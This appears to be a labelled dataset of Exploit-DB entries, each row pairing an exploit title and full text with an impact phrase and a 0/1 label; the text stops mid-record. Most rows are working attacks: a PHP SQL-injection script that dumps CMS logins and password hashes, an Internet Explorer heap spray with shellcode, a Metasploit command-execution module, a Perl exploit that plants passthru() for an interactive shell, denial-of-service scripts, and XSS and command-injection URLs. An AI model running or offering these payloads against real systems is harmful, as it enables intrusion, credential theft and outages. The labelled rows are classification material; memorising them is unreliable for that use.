31867,"CMS Easyway - 'mid' SQL Injection source: https://www.securityfocus.com/bid/29461/info  CMS Easyway is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   <?php ini_set(""max_execution_time"",0); print_r(' ############################################################### # #           EasyWay CMS - SQL Injection Exploit      #                                                              #      Vulnerability discovered by: Lidloses_Auge              #      Exploit coded by:            Lidloses_Auge #      Greetz to:                   -=Player=- , Suicide, g4ms3, enco, #                                   GPM, Free-Hack #      Date:                        30.05.2008 #      Developer:		    http://www.ta-edv.de/index.php?lg=de&css=1&mid=320&art=1 # ############################################################### #                                                              #      Dork:  inurl:""index.php?css=mid=art="" #      Admin Panel: [Target]/cms/ #      Usage: php '.$argv[0].' [Target] [Userid] #      Example for ""http://www.site.com/index.php?css=1&mid=100&art=1"" #      => php '.$argv[0].' http://www.site.com 1 #                                                              ############################################################### '); if ($argc == 3) { echo ""\nExploiting in progress:""; $url = $argv[1]; $source = file_get_contents($url.'/index.php?mid=null+order+by+100/*'); $errorcount = substr_count($source,'not a valid MySQL'); $sql = '/index.php?mid=null+union+select+'; for ($i = 25; $i>=1; $i--) {    $source = file_get_contents($url.'/index.php?mid=null+order+by+'.$i.'/*');    if (substr_count($source,'not a valid MySQL')!=$errorcount) {       $errorcount2 = $i;       $i = 1;    } } for ($j=1; $j<$errorcount2; $j++) {    $sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a),';    } $sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a)+from+cms_benutzer+where+id='.$argv[2].'/*'; $source = file_get_contents($url.$sql); echo ""\n""; if (strpos($source,'::::')!=0) {    echo 'User: '.substr($source,strpos($source,'::::')+5,strpos($source,'::1::')-strpos($source,'::::')-5).""\n"";    echo 'Hash: '.substr($source,strpos($source,'::1::')+5,strpos($source,'::2::')-strpos($source,'::1::')-5).""\n""; } else {    echo 'Exploit failed!'.""\n""; } } else { echo ""\nNot enough arguments!\n""; } ?>","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
10210,"Microsoft Internet Explorer 6/7 - CSS Handling Denial of Service <!-- securitylab.ir K4mr4n_st (at) yahoo (dot) com [email concealed] --> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""> <HTML xmlns=""http://www.w3.org/1999/xhtml""> <HEAD> <script> function load(){ var e; e=document.getElementsByTagName(""STYLE"")[0]; e.outerHTML=""1""; } </script> <STYLE type=""text/css""> body{ overflow: scroll; margin: 0; } </style>  <SCRIPT language=""javascript""> var shellcode = unescape(""%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EEu99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB0%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u 7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063""); var bigblock = unescape(""%u9090%u9090""); var headersize = 20; var slackspace = headersize+shellcode.length; while (bigblock.length<slackspace) bigblock+=bigblock; fillblock = bigblock.substring(0, slackspace); block = bigblock.substring(0, bigblock.length-slackspace); while(block.length+slackspace<0x40000) block = block+block+fillblock; memory = new Array(); for (x=0; x<4000; x++) memory[x] = block + shellcode; </script>  </HEAD> <BODY onload=""load()""> </BODY> </HTML>",denial of service,1
28298,"Yahoo! Messenger 7.0/7.5 - Remote Search String Arbitrary Browser Navigation source: https://www.securityfocus.com/bid/19211/info  Yahoo! Messenger is prone to a browser-navigation vulnerability that may permit a remote attacker to open a browser window on the victim user's computer to an arbitrary page.  This issue occurs because the application fails to sanitize malicious messages.  An attacker may be able to exploit this issue to execute a web browser and load an arbitrary web page. This may lead to other attacks.  This issue affects version 7.5.0.814; other versions may also be vulnerable.  The following examples are sufficient to trigger this issue:  :+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(msg:---------------------------------------------<embed onload=window.open('http:\\\\google.com/')>helomsg  :+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(msg:---------------------------------------------<embed onload=window.open('http:\\\\google.com/')>helomsg :+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(  Note: ""helomsg :"" this space must be created with alt+0160 and this ""s: "" with a space.",open a browser window on the victim user's computer to an arbitrary page,1
26108,Dvbbs 7.1/8.2 - 'dispuser.asp?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/14498/info   DVBBS is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/dispuser.asp?name=Walltrapass[XSS-CODE],execute arbitrary code in the browser of an unsuspecting user in the context of the affected site,1
43023,"TP-Link TL-MR3220 - Cross-Site Scripting # Exploit Title: Vulnerability Xss - TP-LINK TL-MR3220 # Date: 12/10/2017 # Exploit Author: Thiago ""THX"" Sena # Vendor Homepage: http://www.tp-link.com.br # Version: TL-MR3220 # Tested on: Windows 10 # CVE : CVE-2017-15291  Vulnerabilty: Cross-site scripting (XSS) in TP-LINK TL-MR3220 cve: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15291 ---------------------------------------------------------------  PoC:   0x01 - First you go to ( http://IP:PORT/ )  0x02 - In the 'Wireless MAC Filtering' tab.   0x03 - Will add a new MAC Address.  0x04 - In 'Description' it will put the script ( <script>alert('XSS')</script> ) and complete the registration.   0x05 - Xss Vulnerability  --------------------------------------------------------------",code execution,1
41360,"Geutebruck 5.02024 G-Cam/EFD-2250 - 'testaction.cgi' Remote Command Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking   include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'           => 'Geutebruck testaction.cgi Remote Command Execution',       'Description'    => %q{         This module exploits a an arbitrary command execution vulnerability. The         vulnerability exists in the /uapi-cgi/viewer/testaction.cgi page and allows an         anonymous user to execute arbitrary commands with root privileges.         Firmware <= 1.11.0.12 are concerned.         Tested on 5.02024 G-Cam/EFD-2250 running 1.11.0.12 firmware.       },       'Author'         =>         [           'Davy Douhine',	#CVE-2017-5173 (RCE) and metasploit module           'Florent Montel' 	#CVE-2017-5174 (Authentication bypass)           'Frederic Cikala' #CVE-2017-5174 (Authentication bypass)         ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'CVE', '2017-5173' ],           [ 'CVE', '2017-5174' ],           [ 'URL', 'http://geutebruck.com' ]           [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-045-02' ]         ],       'Privileged'     => false,       'Payload'        =>         {           'DisableNops' => true,           'Space'       => 1024,           'Compat'      =>             {               'PayloadType' => 'cmd',               'RequiredCmd' => 'generic netcat bash',             }         },       'Platform'       => 'unix',       'Arch'           => ARCH_CMD,       'Targets'        => [[ 'Automatic', { }]],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Aug 16 2016'))      register_options(       [         OptString.new('TARGETURI', [true, 'The base path to webapp', '/uapi-cgi/viewer/testaction.cgi']),       ], self.class)   end    def exploit     uri = normalize_uri(target_uri.path)     print_status(""#{rhost}:#{rport} - Attempting to exploit..."")     command = payload.encoded     res = send_request_cgi(       {         'uri'    => uri,         'method' => 'POST',         'vars_post' => {           'type' => ""ip"",           'ip' => ""eth0 1.1.1.1;#{command}"",         },     })   end  end",execute arbitrary commands with root privileges,1
25427,OneWorldStore - 'OWContactUs.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/13184/info  OneWorldStore is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/owContactUs.asp?sAction=Contact&sName=&sEmail='%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&sType=None+Specified&sDescription=dcrab,have arbitrary script code executed in the browser of an unsuspecting user,1
35001,SAP NetWeaver 7.0 - SQL Monitor Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/44904/info   The SQL Monitor of SAP NetWeaver is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com:50100/OpenSQLMonitors/servlet/ConnectionMonitorServlet?view=stmtpool&node=12924950&ds=SAPSR3DB&connid =com.sap.sql.jdbc.direct.DirectPooledConnection@1ed00a7<script>alert(document.cookie)</script>  http://www.example.com:50100/OpenSQLMonitors/servlet/CatalogBufferMonitorServlet?action=btnSHOW_COLUMNS&reqNode=12924950&reqBufferId= SAPSERVER:dm0:SAPSR3DB&reqTableColumns=BC_RPROF_PROFILE<script>alert(document.cookie)</script>,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
11117,"iOS Udisk FTP Basic Edition - Remote Denial of Service #!/usr/bin/python # # Apple Iphone/Ipod - Udisk FTP Basic Edition Remote 0day DOS exploit # Found by: Steven Seeley (mr_me) seeleymagic [at] hotmail [dot] com # Homepage: http://6tags.com/n/ # Price: $4.99 # Download: From the app store (use your itunes account) # Tested on: Iphone 3G - firmware 3.1.2 (Darwin kernel) # Greetz to: Corelan Security Team::corelanc0d3r/ekse/EdiStrosar/Rick2600/MarkoT/ # Advisory: http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-003-u-disk-ftp-pre-auth-remote-dos/ # # Note: This **could** be remotley exploitable with code execution.  # I have not reversed this app..  print ""|------------------------------------------------------------------|"" print ""|                         __               __                      |"" print ""|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"" print ""|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"" print ""| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"" print ""| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"" print ""|                                                                  |"" print ""|                                       http://www.corelan.be:8800 |"" print ""|                                              security@corelan.be |"" print ""|                                                                  |"" print ""|-------------------------------------------------[ EIP Hunters ]--|""  print ""[+] Apple Iphone/Ipod - Udisk FTP basic edition Remote DOS exploit"" import socket import sys  def Usage():     print (""Usage:  ./udisk.py <serv_ip>\n"")     print (""Example:./udisk.py 192.168.2.3\n"") if len(sys.argv) <> 2:         Usage()         sys.exit(1) else:     hostname = sys.argv[1]     username = ""anonymous""     passwd = ""\x41"" * 2047     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     try:         sock.connect((hostname, 8080)) 	print ""[+] Connecting to the target..""     except:         print (""[-] Connection error!"")         sys.exit(1)     r=sock.recv(1024)     print ""[+] Sending payload.. ph33r""     sock.send(""USER %s\r\n"" %username)     sock.send(""PASS %s\r\n"" %passwd)     sock.send(""PWD\r\n"")     sock.close()     print ""[+] Server is now DOS'ed!""     sys.exit(0);",DOS,1
28740,HAMweather 3.9.8 - 'template.php' Script Code Injection source: https://www.securityfocus.com/bid/20311/info  HAMweather is prone to a script-code-injection vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  HAMweather 3.9.8.4 and prior versions are vulnerable; other versions may also be affected.  http://www.example.com/hw3.php?daysonly=0).phpinfo().(,fails to sufficiently sanitize user-supplied data,1
30567,"Microsoft Agent - 'agentdpv.dll' ActiveX Control Malformed URL Stack Buffer Overflow source: https://www.securityfocus.com/bid/25566/info  Microsoft Agent (agentsvr.exe) is prone to a stack-based buffer-overflow vulnerability because the application fails to adequately bounds-check user-supplied data.  Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the currently logged-in user. Failed exploit attempts will likely result in denial-of-service conditions.   <script language=""javascript""> function document::OnClick() {         var agent, character, url;         agent = new ActiveXObject(""Agent.Control.2"");         agent.connected = true;         agent.Characters.Load(""Genie"", ""http:///"");         character = agent.Characters.Character(""Genie"");         character.Show();         character.Think (""brazil owns!"");         character.Speak('brazil owns!');         character.Play('Processing'); } </script>",the application fails to adequately bounds-check user-supplied data,0
27172,SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution source: https://www.securityfocus.com/bid/16556/info  SPIP is prone to a remote command-execution vulnerability. This is due to a lack of proper sanitization of user-supplied input.  An attacker can exploit this issue to execute arbitrary remote PHP commands on an affected computer with the privileges of the webserver process.  Successful exploitation could facilitate unauthorized access; other attacks are also possible.  Version 1.8.2g and earlier are vulnerable; other versions may also be affected.  http://www.example.com/spip_rss.php?GLOBALS[type_urls]=/../ecrire/data/spip.log%00  http://www.example.com/spip_acces_doc.php3?id_document=0&file=<?system($_GET[cmd]);?> http://www.example.com/spip_rss.php?cmd=ls%20-la&GLOBALS[type_urls]=/../ecrire/data/spip.log%00,command-execution,1
5408,"LokiCMS 0.3.3 - Remote Command Execution # Author:	__GiReX__ # mySite:	girex.altervista.org # Date:		8/04/08  # CMS: 		LokiCMS <= 0.3.3 # Site:		lokicms.com  # Bug: 		PHP Code Injection # Exploit:	Remote Command Execution  # Vuln Code: admin.php  #	if ($_GET['default'] != '') { // User want's to set the default page #		writeconfig($c_password, $c_title, $c_header, $c_tagline, $c_footnote, stripslashes($_GET['default']), #		$c_theme, $c_language, $c_modrewrite, $c_simplelink, $c_code);  # Our bugged var $_GET['default'] is stripslashed so we don't need magic_quotes_gpc Off # writeconfig() simply put text into Config.php  # This is a very bugged CMS, only most dengerous bug is here reported    #!/usr/bin/perl -w # LokiCMS <= 0.3.3 Remote Command Execution Exploit # Works with magic_quotes_gpc = On # Coded by __GiReX__  use LWP::Simple;  if(not defined $ARGV[0]) {      banner();      print ""[-] Usage: perl $0 [host] [path]\n"";      print ""[-] Example: perl $0 localhost /lokicms/\n\n"";      exit; }   my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];    $host .=  $ARGV[1] unless not defined $ARGV[1];  banner(); get($host.'admin.php?default=\';passthru($_GET[\'cmd\']);//') or die '[-] Error requesting page: admin.php';  while(1) {      print ""[+] Shell:~\$ "";      chomp($cmd = <STDIN>);      last if $cmd eq 'exit';      last if is_error(getprint($host.""includes/Config.php?cmd=${cmd}""));      print $resp; }  sub banner {      print ""[+] LokiCMS <= 0.3.3 Remote Command Execution Exploit\n"";      print ""[+] Coded by __GiReX__\n"";      print ""\n""; }  # milw0rm.com [2008-04-08]",Command Execution,1
39804,"Intuit QuickBooks Desktop 2007 < 2016 - Arbitrary Code Execution + Credits: Maxim Tomashevich from Thegrideon Software + Website: https://www.thegrideon.com/ + Details: https://www.thegrideon.com/qb-internals-sql.html  Vendor: --------------------- www.intuit.com www.intuit.ca www.intuit.co.uk  Product: --------------------- QuickBooks Desktop versions: 2007 - 2016  Vulnerability Type: --------------------- Arbitrary SQL / Code Execution  Vulnerability Details: --------------------- QuickBooks company files are SQL Anywhere database files and other QB formats are based on SQL Anywhere features as well. SQL code (Watcom SQL) is important part of QB workflow and it is arguably more powerful than VBA in MS Access or Excel and at the same time it is completely hidden and starts automatically with every opened file! Functions like xp_write_file, xp_cmdshell are included by default allowing ""rootkit"" installation in just 3 lines of code: get data from table -> xp_write_file -> xp_cmdshell. Procedure in one database can be used to insert code into another directly or using current user credential. Moreover real database content is hidden from QuickBooks users, so there is virtually unlimited storage for code, stolen data, etc. QBX (accountant's transfer copies) and QBM (portable company files) are even easier to modify but supposed to be send to outside accountant for processing during normal workflow. QBX and QBM are compressed SQL dumps, so SQL modification is as hard as replacing zlib compressed ""reload.sql"" file inside compound file. In all cases QuickBooks do not attempt (and have no ways) to verify SQL scripts and start them automatically with ""DBA"" privileges. It should be obvious that all outside files (qbw, qba, qbx, qbm) should be considered extremely dangerous. SQL Anywhere is built for embedded applications so there are number of tricks and functions (like SET HIDDEN clause) to protect SQL code from analysis making this severe QuickBooks design flaw.  Proof of Concept: --------------------- Below you can find company file created in QB 2009 and modified to start ""Notepad.exe"" upon every user login (Admin, no pass). This example will work in any version including 2016 (US, CA, UK) - login procedure execution is required in order to check QB version or edition or to start update, so you will see Notepad before QB ""wrong version"" error message.  https://www.thegrideon.com/qbint/QBFp.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39804.zip  Disclosure Timeline: --------------------- Contacted Vendor: 2016-03-21 Contacted PCI Security Consul: 2016-04-15 PCI Security Consul: 2016-04-19 ""we are looking into this matter"", but no details requested. PoC sent to Vendor: 2016-04-26 [Unexpected and strange day by day activity from Intuit India employees on our website without any attempts to communicate -> public disclosure.] Public Disclosure: 2016-05-10  Severity Level: --------------------- High  Disclaimer: --------------------- Permission is hereby granted for the redistribution of this text, provided that it is not altered except by reformatting, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.",Arbitrary SQL / Code Execution,1
30489,Openads (PHPAdsNew) < 2.0.8 - 'lib-remotehost.inc.php' Remote File Inclusion source: https://www.securityfocus.com/bid/25277/info  Openads (formerly known as phpAdsNew) is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  Openads 2.0.11 and prior versions are vulnerable.   http://www.example.com/libraries/lib-remotehost.inc.php?phpAds_geoPlugin=EviL ShEll,fails to sufficiently sanitize user-supplied data,0
782,"TinyWeb 1.9 - Denial of Service #TinyWeb version 1.9 DoS Exploit #Coded bY ++Karak0rsan++ #Usage:perl tiny.pl [target] #Greetz:Phalaposher,r3d_b4r0n,Hurby,ZzagorR,L4M3R,zeronc,Atak,sloan,fox and #all my friends # w0rdz: cengiz g t ne sokam senin ehehheh bak exploit yay nlan rsa reziL #olacan :D ama #yay nlanmaz belki yay nlansada bo ver nickini s ylemiyom #anlamazlar :P okullar a l yo peder benim #bilg. kald r yo ne yapcam ben #bilmiyom a.k :) siktiri boktan bi dos exploiti yazd k yolluyoz g venlik #sitesine :D neyse uzatmayal m ""I AM 15 YEARS OLD"" ya m z belirtelim :D  $target=$ARGV[0];  if(!$ARGV[0]){         print ""TinyWeb version 1.9 DoS Exploit\n"";         print ""Coded by ++Karak0rsan++\n"";         print ""Usage:perl tiny.pl [target]\n""; }   use IO::Socket; $sock = new IO::Socket::INET( PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Type => SOCK_STREAM, ); close($sock); if($sock){         print ""[+]Attacking...\n""; }   $ish=1;  do { $ish++; use IO::Socket; $socket = new IO::Socket::INET( PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Type => SOCK_STREAM, ) or die ""Didnt Connect,please check your target address!\n""; print $socket ""GET /cgi-bin/.%00./dddd.html HTTP/1.0\r\n""; close($socket); } while ($ish < 10000);  print ""OK ;)\n""; exit();  # milw0rm.com [2005-02-01]",denial of service,1
47715,"VMware WorkStation 12.5.3 - Virtual Machine Escape # VMware Escape Exploit  VMware Escape Exploit before VMware WorkStation 12.5.3  Host Target: Win10 x64  Compiler: VS2013   Test on VMware 12.5.2 build-4638234  # Known issues  * Failing to heap manipulation causes host process crash. (About 50% successful rate ) * Not quite elaborate because I'm not good at doing heap ""fengshui"" on winows LFH.  # FAQ  * Q: Error in reboot vmware after crashing process. * A: Just remove ***.lck** folder in your vm directory or wait a while and have a coffee :).Here is a simple [script](https://raw.githubusercontent.com/unamer/vmware_escape/master/cve-2017-4901/cleanvm.bat) I used to clean up.   ![](https://github.com/unamer/vmware_escape/raw/master/CVE-2017-4905_and_uaf/exploit.gif)  # Reference  * https://keenlab.tencent.com/en/2018/04/23/A-bunch-of-Red-Pills-VMware-Escapes/  EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47715.zip",crash,1
42148,"libquicktime 1.2.4 - Denial of Service libquicktime multiple vulnerabilities   ================ Author : qflb.wu ===============   Introduction: ============= The libquicktime package contains the libquicktime library, various plugins and codecs, along with graphical and command line utilities used for encoding and decoding QuickTime files. This is useful for reading and writing files in the QuickTime format. The goal of the project is to enhance, while providing compatibility with the Quicktime 4 Linux library.   Affected version: ===== 1.2.4   Vulnerability Description: ========================== ################################## 1. the quicktime_read_moov function in moov.c in libquicktime 1.2.4 can cause a denial of service(infinite loop and CPU consumption) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_read_moov_infinite_loop.mp4   POC: libquicktime_1.2.4_quicktime_read_moov_infinite_loop.mp4 CVE: CVE-2017-9122   ################################### 2. the lqt_frame_duration function in lqt_quicktime.c in libquicktime 1.2.4 can cause a denial of service(invalid memory read and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_lqt_frame_duration_invalid_memory_read.mp4   ASAN:SIGSEGV ================================================================= ==14254==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000004 (pc 0x7f31e6ae7185 sp 0x7ffed033a270 bp 0x0000006bdb50 T0) ==14254==WARNING: Trying to symbolize code, but external symbolizer is not initialized!    #0 0x7f31e6ae7184 (/usr/local/lib/libquicktime.so.0+0x6c184)    #1 0x49b1c6 (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x49b1c6)    #2 0x47fbaa (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47fbaa)    #3 0x7f31e43b2ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #4 0x47f3dc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV ??:0 ?? ==14254==ABORTING   debug info: Program received signal SIGSEGV, Segmentation fault. ... Stopped reason: SIGSEGV 0x00007ffff7829185 in lqt_frame_duration (file=<optimized out>, track=<optimized out>,     constant=<optimized out>) at lqt_quicktime.c:1242 1242  return   POC: libquicktime_1.2.4_lqt_frame_duration_invalid_memory_read.mp4 CVE: CVE-2017-9123   ################################### 3. the quicktime_match_32 in util.c in libquicktime 1.2.4 can cause a denial of service(NULL pointer dereference and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_match_32_NULL_pointer_dereference.mp4   ASAN:SIGSEGV ================================================================= ==14359==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fe8af6b85d8 sp 0x7fff490cd4e0 bp 0x7fff490cd5b0 T0) ==14359==WARNING: Trying to symbolize code, but external symbolizer is not initialized!    #0 0x7fe8af6b85d7 (/usr/local/lib/libquicktime.so.0+0x3605d7)    #1 0x7fe8af68b566 (/usr/local/lib/libquicktime.so.0+0x333566)    #2 0x7fe8af63c71a (/usr/local/lib/libquicktime.so.0+0x2e471a)    #3 0x7fe8af3d1658 (/usr/local/lib/libquicktime.so.0+0x79658)    #4 0x7fe8af3d84a8 (/usr/local/lib/libquicktime.so.0+0x804a8)    #5 0x7fe8af3a95da (/usr/local/lib/libquicktime.so.0+0x515da)    #6 0x47fad2 (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47fad2)    #7 0x7fe8acc8fec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #8 0x47f3dc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV ??:0 ?? ==14359==ABORTING   debug info: Program received signal SIGSEGV, Segmentation fault. Stopped reason: SIGSEGV 0x00007ffff7b1d5d8 in quicktime_match_32 (_input=<optimized out>,     _output=<optimized out>) at util.c:874 874if(input[0] == output[0] &&   POC: libquicktime_1.2.4_quicktime_match_32_NULL_pointer_dereference.mp4 CVE: CVE-2017-9124   ################################### 4. the lqt_frame_duration function in lqt_quicktime.c in libquicktime 1.2.4  can cause a denial of service(heap-buffer-overflow) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_lqt_frame_duration_heap-buffer-overflow.mp4   ================================================================= ==40038==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009cd4 at pc 0x7f28959fc45f bp 0x7ffefd561530 sp 0x7ffefd561528 READ of size 4 at 0x602000009cd4 thread T0    #0 0x7f28959fc45e in lqt_frame_duration /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1242    #1 0x49b1c6 in quicktime_print_info /home/a/Downloads/libquicktime-1.2.4/utils/common.c:138    #2 0x47fbaa in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:996    #3 0x47fbaa in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #4 0x7f28932c7ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #5 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009cd4 is located 3 bytes to the right of 1-byte region [0x602000009cd0,0x602000009cd1) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f2895cad7d0 in quicktime_read_stts /home/a/Downloads/libquicktime-1.2.4/src/stts.c:115   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1242 lqt_frame_duration Shadow bytes around the buggy address:  0x0c047fff9340: fa fa 05 fa fa fa 05 fa fa fa 04 fa fa fa 05 fa  0x0c047fff9350: fa fa 00 fa fa fa 05 fa fa fa 05 fa fa fa 05 fa  0x0c047fff9360: fa fa 05 fa fa fa 00 fa fa fa 05 fa fa fa 05 fa  0x0c047fff9370: fa fa 05 fa fa fa 00 fa fa fa 00 00 fa fa 00 01  0x0c047fff9380: fa fa 04 fa fa fa 05 fa fa fa 00 fa fa fa 05 fa =>0x0c047fff9390: fa fa 05 fa fa fa 00 fa fa fa[01]fa fa fa 00 04  0x0c047fff93a0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==40038==ABORTING   POC: libquicktime_1.2.4_lqt_frame_duration_heap-buffer-overflow.mp4 CVE: CVE-2017-9125   ################################### 5. the quicktime_read_dref_table function in dref.c in libquicktime 1.2.4 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_read_dref_table_heap-buffer-overflow.mp4   ================================================================= ==41637==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009ce4 at pc 0x7f9cb9ad16e7 bp 0x7ffcf9a1e720 sp 0x7ffcf9a1e718 WRITE of size 1 at 0x602000009ce4 thread T0    #0 0x7f9cb9ad16e6 in quicktime_read_dref_table /home/a/Downloads/libquicktime-1.2.4/src/dref.c:69    #1 0x7f9cb9ad3bdd in quicktime_read_dref /home/a/Downloads/libquicktime-1.2.4/src/dref.c:147    #2 0x7f9cb9ad0388 in quicktime_read_dinf /home/a/Downloads/libquicktime-1.2.4/src/dinf.c:56    #3 0x7f9cb9afdf09 in quicktime_read_minf /home/a/Downloads/libquicktime-1.2.4/src/minf.c:220    #4 0x7f9cb9afaa9e in quicktime_read_mdia /home/a/Downloads/libquicktime-1.2.4/src/mdia.c:155    #5 0x7f9cb9b4ff1e in quicktime_read_trak /home/a/Downloads/libquicktime-1.2.4/src/trak.c:247    #6 0x7f9cb9b0172a in quicktime_read_moov /home/a/Downloads/libquicktime-1.2.4/src/moov.c:221    #7 0x7f9cb9896658 in quicktime_read_info /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1791    #8 0x7f9cb989d4a8 in do_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2026    #9 0x7f9cb986e5da in quicktime_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2075    #10 0x47fad2 in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:987    #11 0x47fad2 in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #12 0x7f9cb7154ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #13 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009ce4 is located 12 